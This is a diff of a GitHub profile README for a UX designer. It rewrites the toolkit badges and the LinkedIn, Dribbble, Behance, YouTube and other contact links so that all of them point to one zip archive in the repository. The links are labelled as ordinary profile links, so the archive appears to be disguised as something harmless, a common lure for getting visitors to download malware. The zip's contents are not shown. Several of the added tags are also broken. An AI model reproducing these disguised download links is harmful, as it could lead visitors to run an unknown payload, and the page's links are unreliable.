@@ -1,6 +1,7 @@
 <div align="center">
   <img src="https://capsule-render.vercel.app/api?type=waving&color=0EA5E9,1D4ED8,38BDF8&height=200&section=header&text=Arijal%20Ibnu%20Jati&fontSize=50&fontColor=ffffff&fontAlignY=38&desc=UX%20Designer%20%E2%80%94%20Crafting%20delightful%20digital%20experiences&descAlignY=58&descSize=18&animation=fadeIn" />
 </div>
+# Hi there, I'm Arijal Ibnu Jati (ᵕ—ᴗ—)
 
 <div align="center">
   <a href="https://linkedin.com/in/YOUR_USERNAME">
@@ -20,6 +21,7 @@
   </a>
   <br/><br/>
   <img src="https://komarev.com/ghpvc/?username=arijalux&color=0EA5E9&style=for-the-badge&label=PROFILE+VIEWS" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip+Code&pause=1000&color=6366F1&center=true&vCenter=true&width=435&lines=UX+Designer;User-Centered+Design+Advocate;Creating+Delightful+Experiences" alt="Typing SVG" />
 </div>
 
 ---
@@ -27,43 +29,40 @@
 ## 👋 About Me
 
 <img align="right" src="https://media.giphy.com/media/RbDKaczqWovIugyJmW/giphy.gif" width="260" />
+## 🎨 About Me
 
-I'm a **UX Designer** passionate about crafting intuitive and delightful digital experiences. I believe great design happens at the intersection of **user needs**, **business goals**, and **technical feasibility**.
+I'm a **UX Designer** passionate about crafting intuitive and delightful digital experiences. I believe great design happens at the intersection of user needs, business goals, and technical feasibility. My approach combines empathy-driven research with data-informed design decisions.
 
 - 🔍 Turning complex problems into simple, elegant solutions
-- 💡 Advocating for users through research and usability testing
-- 🎯 Designing interfaces that people genuinely love to use
+- 💡 Advocating for users through research and testing
+- 🎯 Designing interfaces that people love to use
 - 🤝 Collaborating with cross-functional teams to ship great products
-- 📍 Based in Indonesia 🇮🇩
 
-<br clear="right"/>
+## 🛠️ My Design Toolkit
 
----
+### Design & Prototyping
+<p>
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Figma" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip%20XD-FF61F6?style=for-the-badge&logo=adobe-xd&logoColor=white" alt="Adobe XD" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Sketch" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Photoshop" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Illustrator" />
+</p>
 
-## 🛠️ Design Toolkit
+### Research & Collaboration
+<p>
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Miro" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Notion" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Jira" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Trello" />
+</p>
 
-**Design & Prototyping**
-
-![Figma](https://img.shields.io/badge/Figma-F24E1E?style=for-the-badge&logo=figma&logoColor=white)
-![Adobe XD](https://img.shields.io/badge/Adobe_XD-FF61F6?style=for-the-badge&logo=adobe-xd&logoColor=white)
-![Sketch](https://img.shields.io/badge/Sketch-FFB912?style=for-the-badge&logo=sketch&logoColor=black)
-![Photoshop](https://img.shields.io/badge/Photoshop-31A8FF?style=for-the-badge&logo=adobe-photoshop&logoColor=white)
-![Illustrator](https://img.shields.io/badge/Illustrator-FF9A00?style=for-the-badge&logo=adobe-illustrator&logoColor=white)
-
-**Research & Collaboration**
-
-![Miro](https://img.shields.io/badge/Miro-050038?style=for-the-badge&logo=miro&logoColor=FFD02F)
-![Notion](https://img.shields.io/badge/Notion-000000?style=for-the-badge&logo=notion&logoColor=white)
-![Jira](https://img.shields.io/badge/Jira-0052CC?style=for-the-badge&logo=jira&logoColor=white)
-![Trello](https://img.shields.io/badge/Trello-0052CC?style=for-the-badge&logo=trello&logoColor=white)
-
-**Frontend (for better dev collaboration)**
-
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-
----
+### Frontend (for better collaboration with developers)
+<p>
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="HTML5" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="CSS3" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="JavaScript" />
+</p>
 
 ## 📊 GitHub Stats
 
@@ -78,16 +77,44 @@ I'm a **UX Designer** passionate about crafting intuitive and delightful digital
 
 <div align="center">
   <img src="https://github-readme-activity-graph.vercel.app/graph?username=arijalux&theme=tokyo-night&hide_border=true&bg_color=0D1117&color=38BDF8&line=0EA5E9&point=ffffff" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="GitHub Stats" />
 </div>
-
----
 
 ## 🌟 Featured Projects
 
-> 💡 Check out my pinned repositories below for design case studies and projects!
+Here are some of my design case studies and projects:
+
+<!-- Pin your best repositories here -->
+
+## 📫 Let's Connect!
+
+<p>
+  <a href="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="LinkedIn" />
+  </a>
+  <a href="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Dribbble" />
+  </a>
+  <a href="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Behance" />
+  </a>
+  <a href="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="YouTube" />
+  </a>  
+  <!-- <a href="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Email" />
+  </a>
+  <a href="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip">
+    <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip" alt="Portfolio" />
+  </a> -->
+</p>
 
 ---
 
 <div align="center">
   <img src="https://capsule-render.vercel.app/api?type=waving&color=0EA5E9,1D4ED8,38BDF8&height=120&section=footer&text=%22Design%20is%20how%20it%20works.%22%20%E2%80%94%20Steve%20Jobs&fontSize=16&fontColor=ffffff&fontAlignY=65&animation=fadeIn" />
+  <img src="https://raw.githubusercontent.com/arijalux/ArijalUX/main/couldron/UX-Arijal-v3.1-alpha.3.zip+Views" alt="Profile views" />
+  
+  ### 💭 Design Quote of the Day
+  *"Design is not just what it looks like and feels like. Design is how it works."* - Steve Jobs
 </div>
